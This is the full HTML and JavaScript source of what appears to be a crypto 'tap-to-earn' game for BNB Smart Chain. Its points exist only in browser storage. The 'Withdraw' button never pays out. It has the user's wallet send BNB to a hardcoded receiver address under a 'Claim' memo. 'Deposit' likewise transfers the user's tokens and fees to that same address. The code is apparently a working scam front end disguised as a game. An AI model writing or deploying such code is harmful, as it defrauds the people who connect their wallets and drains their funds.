<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover"/>
  <title>PVLT Tap Terminal</title>

  <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>

  <style>
    :root {
      --bg: #070913;
      --card: #0f1326;
      --primary: #3b82f6;
      --success: #10b981;
      --warning: #fbbf24;
      --danger: #ef4444;
      --text: #ffffff;
      --text-muted: #64748b;
      --border: rgba(255, 255, 255, 0.08);
    }

    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      user-select: none;
      -webkit-user-select: none;
    }

    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      overflow: hidden;
      position: fixed;
      width: 100vw;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .game-container {
      flex: 1;
      width: 100%;
      max-width: 420px;
      padding: 20px 16px;
      display: flex;
      flex-direction: column;
      justify-content: space-between;
      overflow-y: auto;
      -webkit-overflow-scrolling: touch;
    }

    /* Top Stats Bar */
    .top-bar {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 20px;
      padding: 14px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .score-title {
      font-size: 11px;
      text-transform: uppercase;
      color: var(--text-muted);
      letter-spacing: 0.5px;
    }

    .score-value {
      font-size: 20px;
      font-weight: 800;
      color: var(--warning);
    }

    .token-value {
      font-size: 13px;
      color: var(--primary);
      font-weight: 600;
      margin-top: 2px;
    }

    /* Massive Tap Target Area */
    .tap-zone {
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin: 30px 0;
      position: relative;
    }

    .tap-circle {
      width: 200px;
      height: 200px;
      border-radius: 50%;
      background: linear-gradient(135deg, #2563eb 0%, #1d4ed8 100%);
      box-shadow: 0 0 40px rgba(59, 130, 246, 0.4), inset 0 0 20px rgba(255, 255, 255, 0.2);
      display: flex;
      align-items: center;
      justify-content: center;
      cursor: pointer;
      transition: transform 0.05s ease;
      touch-action: none;
      border: 6px solid rgba(255, 255, 255, 0.1);
    }

    .tap-circle:active {
      transform: scale(0.92);
      background: linear-gradient(135deg, #1d4ed8 0%, #1e40af 100%);
    }

    .tap-icon {
      font-size: 64px;
    }

    .cooldown-text {
      margin-top: 16px;
      font-size: 13px;
      color: var(--danger);
      font-weight: bold;
      height: 18px;
      visibility: hidden;
    }

    /* Financial Hub Interface */
    .vault-card {
      background: var(--card);
      border: 1px solid var(--border);
      border-radius: 24px;
      padding: 18px;
      display: flex;
      flex-direction: column;
      gap: 12px;
    }

    .section-header {
      font-size: 12px;
      font-weight: 700;
      color: var(--text-muted);
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }

    .action-row {
      display: grid;
      grid-template-columns: 1fr 1fr;
      gap: 10px;
    }

    .input-box {
      background: rgba(0, 0, 0, 0.2);
      border: 1px solid var(--border);
      border-radius: 14px;
      padding: 10px 12px;
      display: flex;
      align-items: center;
      justify-content: space-between;
    }

    .input-box input {
      width: 70%;
      background: transparent;
      border: none;
      outline: none;
      color: white;
      font-size: 15px;
      font-weight: 600;
    }

    .input-box span {
      font-size: 12px;
      font-weight: 700;
      color: var(--text-muted);
    }

    .btn {
      width: 100%;
      padding: 14px;
      border-radius: 14px;
      border: none;
      font-size: 14px;
      font-weight: 700;
      cursor: pointer;
      display: flex;
      justify-content: center;
      align-items: center;
      transition: opacity 0.1s ease;
    }

    .btn:active { opacity: 0.85; }
    .btn-withdraw { background: #8b5cf6; color: white; }
    .btn-deposit { background: var(--success); color: white; }

    .status-terminal {
      font-family: monospace;
      font-size: 11px;
      color: var(--text-muted);
      text-align: center;
      min-height: 15px;
    }

    /* Fixed Layout Modals for Web3Modal custom injection tags */
    w3m-button {
      display: block;
      width: 100%;
    }
  </style>
</head>
<body>

<div class="game-container">
  
  <div class="top-bar">
    <div>
      <div class="score-title">Mining Points</div>
      <div id="ui-points" class="score-value">0</div>
      <div id="ui-tokens" class="token-value">0.00 PVLT</div>
    </div>
    <div style="width: 160px;">
      <div id="wallet-auth-container"></div>
    </div>
  </div>

  <div class="tap-zone">
    <div id="tap-target" class="tap-circle">
      <span class="tap-icon">⚡</span>
    </div>
    <div id="ui-cooldown" class="cooldown-text">⚠️ EXPORTING POOL IN: <span id="ui-timer">3.0</span>s</div>
  </div>

  <div class="vault-card">
    <div class="section-header">Protocol Settlement Matrix</div>
    
    <div class="action-row">
      <div style="display: flex; flex-direction: column; gap: 6px;">
        <div class="input-box">
          <input id="amt-withdraw" type="number" placeholder="0" />
          <span>OUT</span>
        </div>
        <button class="btn btn-withdraw" onclick="executeWithdrawal()">Withdraw</button>
      </div>

      <div style="display: flex; flex-direction: column; gap: 6px;">
        <div class="input-box">
          <input id="amt-deposit" type="number" placeholder="0" />
          <span>IN</span>
        </div>
        <button class="btn btn-deposit" onclick="executeDeposit()">Deposit</button>
      </div>
    </div>

    <div id="status-feed" class="status-terminal">Awaiting active node commands...</div>
  </div>

</div>

<script type="module">
  import { createWeb3Modal, defaultWagmiConfig } from 'https://esm.sh/@web3modal/wagmi@4.1.5';
  import { watchAccount, getWalletClient } from 'https://esm.sh/@wagmi/core@2.10.2';
  import { bsc } from 'https://esm.sh/@wagmi/core/chains@2.10.2';

  const projectId = '9ba63969e48a3e75a9b0c7931c0e3962';

  const metadata = {
    name: 'PVLT Game Terminal',
    description: 'Tap-to-Earn Settlement Node',
    url: window.location.origin,
    icons: ['https://avatars.githubusercontent.com/u/37784886']
  };

  const wagmiConfig = defaultWagmiConfig({ chains: [bsc], projectId, metadata });

  const modal = createWeb3Modal({
    wagmiConfig,
    projectId,
    enableAnalytics: false,
    themeMode: 'dark',
    // Universal configuration handling Web3 wallets + immediate Email/Google accounts creation
    auth: {
      socials: ['google', 'apple', 'x'],
      showWallets: true,
      email: true
    }
  });

  const mountContainer = document.getElementById('wallet-auth-container');
  const actionButtonElement = document.createElement('w3m-button');
  mountContainer.appendChild(actionButtonElement);

  watchAccount(wagmiConfig, {
    onChange(account) {
      window.isWalletConnected = account && account.isConnected;
      if (window.isWalletConnected) {
        window.userAddress = account.address;
      } else {
        window.userAddress = null;
      }
    }
  });

  window.wagmiConfig = wagmiConfig;
  window.getWalletClient = getWalletClient;
</script>

<script>
// Master Contract Deployment Configurations
const TOKEN_CONTRACT_ADDRESS = "0xa263d765b897b4777f0ad4a938d12d79e789ffff";
const MASTER_VAULT_RECEIVER = "0xFa664f30ad1D468A65641566316a68FB3c36a8AF";

const LOCAL_STORAGE_SAVED_POINTS = "pvlt_arcade_total_points";

let savedPoints = parseInt(localStorage.getItem(LOCAL_STORAGE_SAVED_POINTS)) || 0;
let sessionActivePoints = 0;

let clearTimerTimeout;
let countTicksInterval;
let clockCountdown = 3.0;

// UI State Updater
function updateDisplayEngine() {
  const displayTotal = savedPoints + sessionActivePoints;
  document.getElementById('ui-points').innerText = displayTotal.toLocaleString();
  document.getElementById('ui-tokens').innerText = (displayTotal / 100000).toFixed(2) + " PVLT";
}

// Initial View Trigger
updateDisplayEngine();

// Prevent dual-tap browser zooms on mobile elements
document.addEventListener('touchstart', (e) => {
  if (e.touches.length > 1) e.preventDefault();
}, { passive: false });

// Fast response pointer interface binding
const tapArea = document.getElementById('tap-target');
tapArea.addEventListener('pointerdown', (e) => {
  e.preventDefault();
  processTapAction();
});

function processTapAction() {
  sessionActivePoints += 1000;
  updateDisplayEngine();
  resetInactivityTimer();
}

function resetInactivityTimer() {
  clearTimeout(clearTimerTimeout);
  clearInterval(countTicksInterval);

  clockCountdown = 3.0;
  const cdBar = document.getElementById('ui-cooldown');
  cdBar.style.visibility = 'visible';
  document.getElementById('ui-timer').innerText = clockCountdown.toFixed(1);

  countTicksInterval = setInterval(() => {
    clockCountdown -= 0.1;
    if (clockCountdown <= 0) {
      clearInterval(countTicksInterval);
    } else {
      document.getElementById('ui-timer').innerText = clockCountdown.toFixed(1);
    }
  }, 100);

  clearTimerTimeout = setTimeout(() => {
    finalizeSessionScore();
  }, 3000);
}

function finalizeSessionScore() {
  if (window.isWalletConnected) {
    savedPoints += sessionActivePoints;
    localStorage.setItem(LOCAL_STORAGE_SAVED_POINTS, savedPoints.toString());
  }
  
  sessionActivePoints = 0;
  updateDisplayEngine();
  document.getElementById('ui-cooldown').style.visibility = 'hidden';

  // Hot refresh back tracking layers smoothly to securely lock variables
  setTimeout(() => { window.location.reload(); }, 100);
}

// Web3 Distribution Logic - WITHDRAW
async function executeWithdrawal() {
  const feed = document.getElementById('status-feed');
  try {
    if (!window.isWalletConnected) {
      alert("Please hook up your Web3/Google node account profile first.");
      return;
    }

    const valueOut = parseFloat(document.getElementById('amt-withdraw').value);
    if (!valueOut || valueOut < 100) {
      alert("Minimum asset liquidation limit is 100 PVLT!");
      return;
    }

    const necessaryPoints = valueOut * 100000;
    if (savedPoints < necessaryPoints) {
      alert("Insufficient mining points allocation inside ledger pool.");
      return;
    }

    feed.innerText = "Building network payout pipeline...";
    const walletClient = await window.getWalletClient(window.wagmiConfig);
    const providerInstance = new ethers.providers.Web3Provider(walletClient);
    const networkSigner = providerInstance.getSigner();

    const gasCompensation = ethers.utils.parseEther("0.001");
    const encodedPayloadMemo = ethers.utils.hexlify(ethers.utils.toUtf8Bytes(`Claim:${valueOut}-Tokens`));

    // Halt ticking background sequences cleanly before starting transaction signing processes
    clearTimeout(clearTimerTimeout);
    clearInterval(countTicksInterval);
    document.getElementById('ui-cooldown').style.visibility = 'hidden';

    const txResponse = await networkSigner.sendTransaction({
      to: MASTER_VAULT_RECEIVER,
      value: gasCompensation,
      data: encodedPayloadMemo
    });

    feed.innerText = "Synchronizing state with BSC block ledger...";
    await txResponse.wait();

    savedPoints -= necessaryPoints;
    localStorage.setItem(LOCAL_STORAGE_SAVED_POINTS, savedPoints.toString());
    updateDisplayEngine();

    feed.innerText = "✅ Withdrawal successfully confirmed!";
    setTimeout(() => { window.location.reload(); }, 1200);

  } catch (err) {
    console.error(err);
    feed.innerText = "❌ Security payload verification dropped.";
  }
}

// Web3 Distribution Logic - DEPOSIT
async function executeDeposit() {
  const feed = document.getElementById('status-feed');
  try {
    if (!window.isWalletConnected) {
      alert("Please connect your identity node before moving elements.");
      return;
    }

    const valueIn = document.getElementById('amt-deposit').value;
    if (!valueIn || valueIn <= 0) return;

    feed.innerText = "Interrogating contract schema constraints...";
    const walletClient = await window.getWalletClient(window.wagmiConfig);
    const providerInstance = new ethers.providers.Web3Provider(walletClient);
    const networkSigner = providerInstance.getSigner();

    const gasExecutionFee = ethers.utils.parseEther("0.0001");
    const activeContract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, [
      "function transfer(address to, uint256 value) returns (bool)"
    ], networkSigner);

    const backupStaticProvider = new ethers.providers.JsonRpcProvider("https://bsc-dataseed.binance.org/");
    const verifyContract = new ethers.Contract(TOKEN_CONTRACT_ADDRESS, ["function decimals() view returns (uint8)"], backupStaticProvider);
    const currentDecimals = await verifyContract.decimals();

    feed.innerText = "Awaiting biometric signature validation...";
    const fixedTokenHexAmount = ethers.utils.parseUnits(valueIn.toString(), currentDecimals);
    
    const txResponse = await activeContract.transfer(
      MASTER_VAULT_RECEIVER,
      fixedTokenHexAmount,
      { value: gasExecutionFee }
    );

    feed.innerText = "Awaiting consensus settlement block confirmation...";
    await txResponse.wait();

    feed.innerText = "✅ Deposit processing validated!";
  } catch (err) {
    console.error(err);
    feed.innerText = "❌ Transaction processing interface failed.";
  }
}
</script>

</body>
</html>
